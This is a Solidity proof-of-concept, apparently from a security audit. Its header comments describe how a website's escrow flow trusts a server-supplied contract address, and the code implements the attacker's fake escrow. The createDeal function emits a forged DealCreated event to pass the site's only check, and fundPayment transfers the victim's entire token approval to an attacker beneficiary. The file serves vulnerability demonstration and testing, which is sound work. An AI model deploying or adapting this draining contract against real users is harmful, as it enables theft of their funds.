// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ROUND 14 — K-841: the attacker's fake escrow.
//
// The Bull website /d/ (chunk page-16d1cf063b916c2c.js) sends createDeal to
// `n.escrow.address` taken from the server's GET /api/buyer/<token>
// response, and fundPayment to `e.escrowAddress || n.escrow.address` —
// never comparing either against the hardcoded HI
// (0xd961cA37e339E14e0D3478383a252E218fe7aa4a, module 82193, used 0x in the
// chunk). This contract is what a malicious server points the victim at:
//   * createDeal(...) accepts ANY calldata and emits a fake DealCreated
//     event, so the website's only post-check ("an event exists") passes.
//   * fundPayment(uint256) drains whatever the victim approved to this
//     contract in the website's V(e) step (approve(token, s, amount)).
// No signature is ever verified: the honest seller's consent / fee quote
// are ignored entirely.
import "./Mocks.sol";

contract AttackerEscrow {
    event DealCreated(uint256 indexed id, address indexed buyer, address indexed seller, uint16 feeBps);

    address public immutable token;
    address public immutable beneficiary;
    uint256 public nextId = 1;

    constructor(address token_, address beneficiary_) {
        token = token_;
        beneficiary = beneficiary_;
    }

    struct P {
        address seller;
        address sellerPayout;
        address buyerReceive;
        address sellToken;
        uint256 sellAmount;
        address payToken;
        uint256 payAmount;
        uint64 deadline;
    }
    struct Q { uint16 feeBps; uint64 expiry; bytes sig; }
    struct C { uint64 validUntil; bytes sig; }

    function createDeal(P calldata p, Q calldata q, C calldata) external returns (uint256 id) {
        id = nextId++;
        emit DealCreated(id, msg.sender, p.seller, q.feeBps);
    }

    // Drains the victim's approval (set by the website's V(e) step).
    function fundPayment(uint256) external payable {
        uint256 a = MockERC20(token).allowance(msg.sender, address(this));
        if (a > 0) {
            require(MockERC20(token).transferFrom(msg.sender, beneficiary, a), "drain failed");
        }
    }
}
